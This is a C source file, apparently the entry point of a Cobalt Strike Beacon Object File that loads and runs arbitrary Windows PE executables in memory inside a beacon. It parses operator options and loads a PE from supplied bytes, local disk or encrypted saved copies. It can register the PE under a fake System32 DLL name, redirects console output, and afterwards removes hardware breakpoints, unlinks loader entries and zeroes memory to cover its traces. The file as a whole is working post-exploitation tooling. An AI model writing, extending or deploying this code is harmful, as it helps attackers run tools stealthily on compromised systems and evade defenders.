
#include <windows.h>
#include "output.h"
#include "peb.c"
#include "loader.c"
#include "console.c"
#include "runner.c"
#include "hwbp.c"
#include "utils.c"
#include "apisetlookup.c"

int go(IN PCHAR Buffer, IN ULONG Length)
{
    datap           parser        = { 0 };
    int             pe_length     = 0;
    LPSTR           pe_name       = NULL;
    LPWSTR          pe_wname      = NULL;
    LPWSTR          pe_wpath      = NULL;
    PVOID           pe_bytes      = 0;
    LPSTR           pe_path       = 0;
    BOOL            local         = FALSE;
    UINT32          timeout       = 0;
    BOOL            headers       = FALSE;
    LPWSTR          cmdwline      = NULL;
    LPCSTR          cmdline       = NULL;
    LPSTR           method        = NULL;
    BOOL            use_unicode   = FALSE;
    BOOL            nooutput      = FALSE;
    BOOL            alloc_console = FALSE;
    BOOL            close_handles = FALSE;
    BOOL            unload_libs   = FALSE;
    BOOL            dont_save     = FALSE;
    BOOL            list_pes      = FALSE;
    LPSTR           unload_pe     = NULL;
    BOOL            recovered_pe  = FALSE;
    LPSTR           username      = NULL;
    LPSTR           loadtime      = NULL;
    BOOL            link_to_peb   = FALSE;
    BOOL            dont_unload   = FALSE;
    PLIB_LOADED     libs_tmp      = NULL;
    PLIB_LOADED     libs_entry    = NULL;
    NTSTATUS        status        = STATUS_UNSUCCESSFUL;
    PLOADED_PE_INFO peinfo        = NULL;

    BeaconDataParse(&parser, Buffer, Length);
    pe_wname      = (LPWSTR)BeaconDataExtract(&parser, NULL);
    pe_wname      = pe_wname[0] ? pe_wname : NULL;
    pe_name       = BeaconDataExtract(&parser, NULL);
    pe_name       = pe_name[0] ? pe_name : NULL;
    pe_wpath      = (LPWSTR)BeaconDataExtract(&parser, NULL);
    pe_wpath      = pe_wpath[0] ? pe_wpath : NULL;
    pe_bytes      = BeaconDataExtract(&parser, &pe_length);
    pe_path       = BeaconDataExtract(&parser, NULL);
    pe_path       = pe_path[0] ? pe_path : NULL;
    local         = BeaconDataInt(&parser);
    timeout       = BeaconDataInt(&parser);
    headers       = BeaconDataInt(&parser);
    cmdwline      = (LPWSTR)BeaconDataExtract(&parser, NULL);
    cmdline       = BeaconDataExtract(&parser, NULL);
    method        = BeaconDataExtract(&parser, NULL);
    use_unicode   = BeaconDataInt(&parser);
    nooutput      = BeaconDataInt(&parser);
    alloc_console = BeaconDataInt(&parser);
    close_handles = BeaconDataInt(&parser);
    unload_libs   = BeaconDataInt(&parser);
    dont_save     = BeaconDataInt(&parser);
    list_pes      = BeaconDataInt(&parser);
    unload_pe     = BeaconDataExtract(&parser, NULL);
    unload_pe     = unload_pe[0] ? unload_pe : NULL;
    username      = BeaconDataExtract(&parser, NULL);
    username      = username[0] ? username : NULL;
    loadtime      = BeaconDataExtract(&parser, NULL);
    loadtime      = loadtime[0] ? loadtime : NULL;
    link_to_peb   = BeaconDataInt(&parser);
    dont_unload   = BeaconDataInt(&parser);

    peinfo = intAlloc(sizeof(LOADED_PE_INFO));

    wcscpy(peinfo->pe_wname, pe_wname ? pe_wname : L"NoConsolation.dll");
    wcscpy(peinfo->pe_wpath, pe_wpath ? pe_wpath : L"C:\\Windows\\System32\\NoConsolation.dll");
    peinfo->timeout       = timeout;
    peinfo->headers       = headers;
    peinfo->method        = method[0] ? method : NULL;
    peinfo->use_unicode   = use_unicode;
    peinfo->cmdwline      = cmdwline[0] ? cmdwline : NULL;
    peinfo->cmdline       = cmdline[0] ? cmdline : NULL;
    peinfo->nooutput      = nooutput;
    peinfo->alloc_console = alloc_console;
    peinfo->unload_libs   = unload_libs;
    peinfo->link_to_peb   = link_to_peb;
    peinfo->dont_unload   = dont_unload;
    peinfo->is_dependency = FALSE;

    // save a reference to peinfo
    BeaconAddValue(NC_PE_INFO_KEY, peinfo);

    if (list_pes)
    {
        list_saved_pes();
        goto Cleanup;
    }

    if (unload_pe)
    {
        if (remove_saved_pe(unload_pe))
        {
            PRINT("removed %s", unload_pe);
            goto Cleanup;
        }
        else
        {
            PRINT_ERR("failed to remove %s", unload_pe);
            goto Cleanup;
        }
    }

    // if no PE was provided, go to cleanup
    if (!pe_name && !pe_path && !pe_length)
        goto Cleanup;

    // the PE was provided by the operator
    if (pe_bytes && pe_length)
    {
        if (!dont_save)
            save_pe_info(pe_name, pe_bytes, pe_length, username, loadtime);
    }
    // read PE from local filesystem
    else if (local)
    {
        if (!read_local_pe(pe_path, &pe_bytes, &pe_length))
        {
            PRINT_ERR("failed to load %s", pe_path);
            goto Cleanup;
        }
        if (!dont_save)
            save_pe_info(pe_name, pe_bytes, pe_length, username, loadtime);
    }
    // recover executable from saved PEs
    else
    {
        if (!get_saved_pe(pe_name, &pe_bytes, &pe_length))
        {
            PRINT_ERR("failed to load %s from saved binaries", pe_name);
            goto Cleanup;
        }
        recovered_pe = TRUE;
    }

    if (!load_pe(pe_bytes, pe_length, peinfo))
    {
        PRINT_ERR("peload failure");
        goto Cleanup;
    }

    if (!create_thread(&peinfo->hThread))
    {
        PRINT_ERR("failed to create thread");
        goto Cleanup;
    }

    if (!redirect_std_out_err(peinfo))
    {
        PRINT_ERR("failed to redirect output");
        goto Cleanup;
    }

    if (!run_pe(peinfo))
    {
        PRINT_ERR("failed to run pe");
        goto Cleanup;
    }

Cleanup:
    if (recovered_pe)
        reencrypt_pe(pe_name);

    if (local && pe_bytes)
    {
        memset(pe_bytes, 0, pe_length);
        intFree(pe_bytes);
    }

    if (peinfo && peinfo->hHwBp1)
        remove_hwbp_handler(peinfo->hHwBp1);

    if (peinfo && peinfo->hHwBp2)
        remove_hwbp_handler(peinfo->hHwBp2);

    if (close_handles)
    {
        DPRINT("Freeing handles");
        if (peinfo && peinfo->Handles && peinfo->Handles->fo_msvc)
        {
            void ( WINAPI *msvcrt_close ) ( int ) = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "_close", 0);
            if (msvcrt_close)
                msvcrt_close(peinfo->Handles->fo_msvc);
        }

        if (peinfo && peinfo->Handles && peinfo->Handles->fo_ucrtbase)
        {
            void ( WINAPI *ucrtbase_close ) ( int ) = xGetProcAddress(xGetLibAddress("ucrtbase", TRUE, NULL), "_close", 0);
            if (ucrtbase_close)
                ucrtbase_close(peinfo->Handles->fo_ucrtbase);
        }

        if (peinfo && peinfo->Handles && peinfo->Handles->hRead)
            NtClose(peinfo->Handles->hRead);

        if (peinfo && peinfo->Handles && peinfo->Handles->hWrite)
            NtClose(peinfo->Handles->hWrite);

        if (peinfo && peinfo->Handles)
        {
            memset(peinfo->Handles, 0, sizeof(HANDLE_INFO));
            intFree(peinfo->Handles);
        }

        BeaconRemoveValue(NC_HANDLE_INFO_KEY);
    }

    if (!dont_unload)
    {
#ifdef _WIN64
        if (peinfo && peinfo->func_table)
            remove_inverted_function_table_entry(peinfo->func_table);
#endif

        if (peinfo && peinfo->linked)
            unlink_module(peinfo->ldr_entry);

        if (peinfo && peinfo->ldr_entry)
        {
            memset(((PLDR_DATA_TABLE_ENTRY2)peinfo->ldr_entry)->BaseDllName.Buffer, 0, sizeof(WCHAR) * MAX_PATH);
            intFree(((PLDR_DATA_TABLE_ENTRY2)peinfo->ldr_entry)->BaseDllName.Buffer);
            memset(((PLDR_DATA_TABLE_ENTRY2)peinfo->ldr_entry)->FullDllName.Buffer, 0, sizeof(WCHAR) * MAX_PATH);
            intFree(((PLDR_DATA_TABLE_ENTRY2)peinfo->ldr_entry)->FullDllName.Buffer);
            memset(peinfo->ldr_entry, 0, sizeof(PLDR_DATA_TABLE_ENTRY2));
            intFree(peinfo->ldr_entry);
        }

        if (peinfo && peinfo->pe_base)
        {
            peinfo->pe_size = 0;
            status = NtFreeVirtualMemory(NtCurrentProcess(), &peinfo->pe_base, &peinfo->pe_size, MEM_RELEASE);
            if (!NT_SUCCESS(status))
            {
                syscall_failed("NtFreeVirtualMemory", status);
                PRINT_ERR("Failed to cleanup PE from memory");
            }
        }
    }

    if (peinfo && peinfo->modified_msvc_stdout)
        memcpy(peinfo->msvc_stdout, peinfo->original_msvc_stdout, sizeof(FILE));

    if (peinfo && peinfo->modified_msvc_stderr)
        memcpy(peinfo->msvc_stderr, peinfo->original_msvc_stderr, sizeof(FILE));

    if (peinfo && peinfo->modified_ucrtbase_stdout)
        memcpy(peinfo->ucrtbase_stdout, peinfo->original_ucrtbase_stdout, sizeof(UCRTBASE_FILE));

    if (peinfo && peinfo->modified_ucrtbase_stderr)
        memcpy(peinfo->ucrtbase_stderr, peinfo->original_ucrtbase_stderr, sizeof(UCRTBASE_FILE));

    if (peinfo && peinfo->original_msvc_stdout)
    {
        memset(peinfo->original_msvc_stdout, 0, sizeof(FILE));
        intFree(peinfo->original_msvc_stdout);
    }

    if (peinfo && peinfo->original_msvc_stderr)
    {
        memset(peinfo->original_msvc_stderr, 0, sizeof(FILE));
        intFree(peinfo->original_msvc_stderr);
    }

    if (peinfo && peinfo->original_ucrtbase_stdout)
    {
        memset(peinfo->original_ucrtbase_stdout, 0, sizeof(UCRTBASE_FILE));
        intFree(peinfo->original_ucrtbase_stdout);
    }

    if (peinfo && peinfo->original_ucrtbase_stderr)
    {
        memset(peinfo->original_ucrtbase_stderr, 0, sizeof(UCRTBASE_FILE));
        intFree(peinfo->original_ucrtbase_stderr);
    }

    if (peinfo && peinfo->modified_console_handle)
        set_console_handle(peinfo->original_console_handle);

    if (peinfo && peinfo->modified_console_reference)
        *(PHANDLE)peinfo->console_reference_addr = peinfo->original_console_reference;

    if (peinfo && peinfo->hThread)
    {
        TerminateThread(peinfo->hThread, 0);
        NtClose(peinfo->hThread);
    }

    if (peinfo && unload_libs)
    {
        libs_entry = peinfo->libs_loaded;
        while (libs_entry)
        {
            DPRINT("Freeing %s", libs_entry->name);
            FreeLibrary(libs_entry->address);

            libs_tmp = libs_entry->next;
            memset(libs_entry, 0, sizeof(LIB_LOADED));
            intFree(libs_entry);
            libs_entry = libs_tmp;
        }
    }

    if (peinfo)
    {
        memset(peinfo, 0, sizeof(LOADED_PE_INFO));
        intFree(peinfo);
    }

    BeaconRemoveValue(NC_PE_INFO_KEY);

    return 0;
}
